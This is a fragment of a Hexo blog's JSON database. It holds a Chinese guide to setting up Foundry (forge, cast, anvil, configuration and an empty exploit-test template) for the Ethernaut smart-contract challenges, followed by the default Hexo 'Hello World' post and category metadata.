class=\"string\">&quot;0.8.19&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Etherscan API 配置 (可选)</span></span><br><span class=\"line\"><span class=\"section\">[etherscan]</span></span><br><span class=\"line\"><span class=\"attr\">mainnet</span> = &#123; key = <span class=\"string\">&quot;$&#123;API_KEY_ETHERSCAN&#125;&quot;</span> &#125;</span><br><span class=\"line\"><span class=\"attr\">sepolia</span> = &#123; key = <span class=\"string\">&quot;$&#123;API_KEY_ETHERSCAN&#125;&quot;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># RPC 端点配置</span></span><br><span class=\"line\"><span class=\"section\">[rpc_endpoints]</span></span><br><span class=\"line\"><span class=\"attr\">mainnet</span> = <span class=\"string\">&quot;https://rpc.ankr.com/eth&quot;</span></span><br><span class=\"line\"><span class=\"attr\">sepolia</span> = <span class=\"string\">&quot;https://rpc.ankr.com/eth_sepolia&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装依赖\"><a href=\"#安装依赖\" class=\"headerlink\" title=\"安装依赖\"></a>安装依赖</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装项目依赖</span></span><br><span class=\"line\">forge install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 手动安装特定依赖 (如果需要)</span></span><br><span class=\"line\">forge install openzeppelin/openzeppelin-contracts</span><br><span class=\"line\">forge install foundry-rs/forge-std</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 更新依赖到最新版本</span></span><br><span class=\"line\">forge update</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🧪-基本使用\"><a href=\"#🧪-基本使用\" class=\"headerlink\" title=\"🧪 基本使用\"></a>🧪 基本使用</h2><h3 id=\"编译合约\"><a href=\"#编译合约\" class=\"headerlink\" title=\"编译合约\"></a>编译合约</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 编译所有合约</span></span><br><span class=\"line\">forge build</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 编译特定合约</span></span><br><span class=\"line\">forge build src/Fallback.sol</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看编译输出</span></span><br><span class=\"line\"><span class=\"built_in\">ls</span> out/</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行所有测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 运行特定测试合约</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 详细输出 (多个 v 增加详细程度)</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 运行特定测试函数</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-test testFallbackExploit -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 显示 gas 报告</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --gas-report</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"使用-Anvil-本地测试网\"><a href=\"#使用-Anvil-本地测试网\" class=\"headerlink\" title=\"使用 Anvil 本地测试网\"></a>使用 Anvil 本地测试网</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 启动本地测试网 (新终端)</span></span><br><span class=\"line\">anvil</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在另一个终端中，针对本地网络运行测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --fork-url http://localhost:8545</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🔧-常用-Foundry-命令\"><a href=\"#🔧-常用-Foundry-命令\" class=\"headerlink\" title=\"🔧 常用 Foundry 命令\"></a>🔧 常用 Foundry 命令</h2><h3 id=\"Forge-命令\"><a href=\"#Forge-命令\" class=\"headerlink\" title=\"Forge 命令\"></a>Forge 命令</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 项目管理</span></span><br><span class=\"line\">forge init my-project          <span class=\"comment\"># 初始化新项目</span></span><br><span class=\"line\">forge build                    <span class=\"comment\"># 编译合约</span></span><br><span class=\"line\">forge clean                    <span class=\"comment\"># 清理编译输出</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 测试相关</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span>                     <span class=\"comment\"># 运行测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --watch            <span class=\"comment\"># 监视文件变化并自动测试</span></span><br><span class=\"line\">forge coverage                <span class=\"comment\"># 代码覆盖率报告</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 依赖管理</span></span><br><span class=\"line\">forge install &lt;dependency&gt;     <span class=\"comment\"># 安装依赖</span></span><br><span class=\"line\">forge remove &lt;dependency&gt;     <span class=\"comment\"># 移除依赖</span></span><br><span class=\"line\">forge update                  <span class=\"comment\"># 更新依赖</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 代码格式化</span></span><br><span class=\"line\">forge <span class=\"built_in\">fmt</span>                     <span class=\"comment\"># 格式化 Solidity 代码</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Cast-命令\"><a href=\"#Cast-命令\" class=\"headerlink\" title=\"Cast 命令\"></a>Cast 命令</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查询区块链信息</span></span><br><span class=\"line\">cast block-number             <span class=\"comment\"># 获取最新区块号</span></span><br><span class=\"line\">cast balance &lt;address&gt;        <span class=\"comment\"># 查询地址余额</span></span><br><span class=\"line\">cast storage &lt;address&gt; &lt;slot&gt; <span class=\"comment\"># 读取存储槽</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 调用合约</span></span><br><span class=\"line\">cast call &lt;address&gt; &lt;signature&gt; [args]  <span class=\"comment\"># 只读调用</span></span><br><span class=\"line\">cast send &lt;address&gt; &lt;signature&gt; [args]  <span class=\"comment\"># 状态变更调用</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 工具函数</span></span><br><span class=\"line\">cast keccak <span class=\"string\">&quot;function_signature()&quot;</span>      <span class=\"comment\"># 计算函数选择器</span></span><br><span class=\"line\">cast abi-encode <span class=\"string\">&quot;func(uint256)&quot;</span> 123     <span class=\"comment\"># ABI 编码</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Anvil-命令\"><a href=\"#Anvil-命令\" class=\"headerlink\" title=\"Anvil 命令\"></a>Anvil 命令</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 启动本地测试网</span></span><br><span class=\"line\">anvil                         <span class=\"comment\"># 默认配置</span></span><br><span class=\"line\">anvil --port 8545            <span class=\"comment\"># 指定端口</span></span><br><span class=\"line\">anvil --accounts 20          <span class=\"comment\"># 指定账户数量</span></span><br><span class=\"line\">anvil --balance 1000         <span class=\"comment\"># 每个账户初始余额 (ETH)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 从特定状态分叉</span></span><br><span class=\"line\">anvil --fork-url https://rpc.ankr.com/eth</span><br><span class=\"line\">anvil --fork-url https://rpc.ankr.com/eth --fork-block-number 19000000</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-Ethernaut-专用配置\"><a href=\"#🎯-Ethernaut-专用配置\" class=\"headerlink\" title=\"🎯 Ethernaut 专用配置\"></a>🎯 Ethernaut 专用配置</h2><h3 id=\"环境变量配置\"><a href=\"#环境变量配置\" class=\"headerlink\" title=\"环境变量配置\"></a>环境变量配置</h3><p>创建 <code>.env</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># .env 文件</span></span><br><span class=\"line\">ETHERSCAN_API_KEY=your_etherscan_api_key</span><br><span class=\"line\">MAINNET_RPC_URL=https://rpc.ankr.com/eth</span><br><span class=\"line\">SEPOLIA_RPC_URL=https://rpc.ankr.com/eth_sepolia</span><br><span class=\"line\">PRIVATE_KEY=your_private_key_for_testing</span><br></pre></td></tr></table></figure>\n\n<p>加载环境变量：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 在 shell 中加载</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> .<span class=\"built_in\">env</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 或在 foundry.toml 中配置自动加载</span></span><br><span class=\"line\">[profile.default]</span><br><span class=\"line\">env_file = <span class=\"string\">&quot;.env&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"测试模板\"><a href=\"#测试模板\" class=\"headerlink\" title=\"测试模板\"></a>测试模板</h3><p>创建标准测试文件模板：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/TargetContract.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TargetContractTest is Test &#123;</span><br><span class=\"line\">    TargetContract public instance;</span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署目标合约</span><br><span class=\"line\">        instance = new TargetContract();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 初始化攻击者账户</span><br><span class=\"line\">        vm.deal(attacker, 10 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 攻击逻辑</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertTrue(/* 验证条件 */);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🐛-常见问题解决\"><a href=\"#🐛-常见问题解决\" class=\"headerlink\" title=\"🐛 常见问题解决\"></a>🐛 常见问题解决</h2><h3 id=\"编译错误\"><a href=\"#编译错误\" class=\"headerlink\" title=\"编译错误\"></a>编译错误</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 清理并重新编译</span></span><br><span class=\"line\">forge clean &amp;&amp; forge build</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查 Solidity 版本兼容性</span></span><br><span class=\"line\">forge build --force</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看详细错误信息</span></span><br><span class=\"line\">forge build --verbose</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"依赖问题\"><a href=\"#依赖问题\" class=\"headerlink\" title=\"依赖问题\"></a>依赖问题</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 重新安装依赖</span></span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf lib/</span><br><span class=\"line\">forge install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查 Git 子模块状态</span></span><br><span class=\"line\">git submodule status</span><br><span class=\"line\">git submodule update --init --recursive</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"测试失败\"><a href=\"#测试失败\" class=\"headerlink\" title=\"测试失败\"></a>测试失败</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 增加详细输出</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> -vvvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用调试器</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --debug &lt;test_function&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查 gas 使用情况</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --gas-report</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-进阶配置\"><a href=\"#📚-进阶配置\" class=\"headerlink\" title=\"📚 进阶配置\"></a>📚 进阶配置</h2><h3 id=\"多版本-Solidity-支持\"><a href=\"#多版本-Solidity-支持\" class=\"headerlink\" title=\"多版本 Solidity 支持\"></a>多版本 Solidity 支持</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># foundry.toml</span></span><br><span class=\"line\"><span class=\"section\">[profile.default]</span></span><br><span class=\"line\"><span class=\"attr\">solc</span> = <span class=\"string\">&quot;0.8.19&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[profile.legacy]</span></span><br><span class=\"line\"><span class=\"attr\">solc</span> = <span class=\"string\">&quot;0.6.12&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"自定义测试配置\"><a href=\"#自定义测试配置\" class=\"headerlink\" title=\"自定义测试配置\"></a>自定义测试配置</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[profile.default.fuzz]</span></span><br><span class=\"line\"><span class=\"attr\">runs</span> = <span class=\"number\">1000</span></span><br><span class=\"line\"><span class=\"attr\">max_test_rejects</span> = <span class=\"number\">65536</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[profile.default.invariant]</span></span><br><span class=\"line\"><span class=\"attr\">runs</span> = <span class=\"number\">256</span></span><br><span class=\"line\"><span class=\"attr\">depth</span> = <span class=\"number\">32</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Gas-优化设置\"><a href=\"#Gas-优化设置\" class=\"headerlink\" title=\"Gas 优化设置\"></a>Gas 优化设置</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[profile.default.optimizer]</span></span><br><span class=\"line\"><span class=\"attr\">enabled</span> = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">runs</span> = <span class=\"number\">200</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[profile.default.model_checker]</span></span><br><span class=\"line\"><span class=\"attr\">contracts</span> = &#123; <span class=\"string\">&quot;/path/to/project/src/Contract.sol&quot;</span> = [ <span class=\"string\">&quot;Contract&quot;</span> ] &#125;</span><br><span class=\"line\"><span class=\"attr\">engine</span> = <span class=\"string\">&quot;chc&quot;</span></span><br><span class=\"line\"><span class=\"attr\">targets</span> = [ <span class=\"string\">&quot;assert&quot;</span>, <span class=\"string\">&quot;underflow&quot;</span>, <span class=\"string\">&quot;overflow&quot;</span>, <span class=\"string\">&quot;divByZero&quot;</span> ]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎓-总结\"><a href=\"#🎓-总结\" class=\"headerlink\" title=\"🎓 总结\"></a>🎓 总结</h2><p>现在您已经完成了 Foundry 开发环境的搭建，可以开始 Ethernaut 安全挑战的学习之旅了！</p>\n<h3 id=\"下一步：\"><a href=\"#下一步：\" class=\"headerlink\" title=\"下一步：\"></a>下一步：</h3><ol>\n<li><strong>熟悉 Foundry 基本命令</strong></li>\n<li><strong>运行第一个测试</strong>: <code>forge test --match-contract FallbackTest -vvv</code></li>\n<li><strong>开始学习</strong>: <a href=\"/2025/01/25/ethernaut-level-01-fallback/\">Level 1 - Fallback</a></li>\n</ol>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"https://book.getfoundry.sh/\">Foundry 官方文档</a></strong></li>\n<li><strong><a href=\"https://github.com/foundry-rs/foundry\">Foundry GitHub</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">下一篇: Level 1 - Fallback</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n</ul>\n<hr>\n<p><em>工欲善其事，必先利其器。掌握好工具，才能更好地学习智能合约安全。</em> 🔧</p>\n"},{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpo0025bf5q3751dbnw","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cmfc7zboq0001bf5q1n3kad9f","category_id":"cmfc7zbou0004bf5qc0c6gicb","_id":"cmfc7zbp4000jbf5q84hj0ezl"},{"post_id":"cmfc7zbot0003bf5q88kh29z4","category_id":"cmfc7zbp0000cbf5qcu6ze2k0","_id":"cmfc7zbpg001bbf5qe8y6e2pi"},{"post_id":"cmfc7zbot0003bf5q88kh29z4","category_id":"cmfc7zbpc0012bf5q1k9gdz63","_id":"cmfc7zbpg001dbf5q7iumcdo7"},{"post_id":"cmfc7zbp5000nbf5q1yxb7cbv","category_id":"cmfc7zbp4000kbf5q8gwx3tju","_id":"cmfc7zbpk001nbf5q5k32gahx"},{"post_id":"cmfc7zbp5000nbf5q1yxb7cbv","category_id":"cmfc7zbpg001abf5qc0vaef9w","_id":"cmfc7zbpl001qbf5q826ddeuf"},{"post_id":"cmfc7zbox0007bf5q5tek3nka","category_id":"cmfc7zbp4000kbf5q8gwx3tju","_id":"cmfc7zbpm001vbf5q30vz7vo2"},{"post_id":"cmfc7zbox0007bf5q5tek3nka","category_id":"cmfc7zbpg001abf5qc0vaef9w","_id":"cmfc7zbpn001ybf5q7cm25byj"},{"post_id":"cmfc7zbp5000pbf5qcp9lgy5y","category_id":"cmfc7zbp4000kbf5q8gwx3tju","_id":"cmfc7zbpo0023bf5q5thk519h"},{"post_id":"cmfc7zbp5000pbf5qcp9lgy5y","category_id":"cmfc7zbpg001abf5qc0vaef9w","_id":"cmfc7zbpp0026bf5qcmuyggko"},{"post_id":"cmfc7zbp7000sbf5q9cik2wel","category_id":"cmfc7zbp4000kbf5q8gwx3t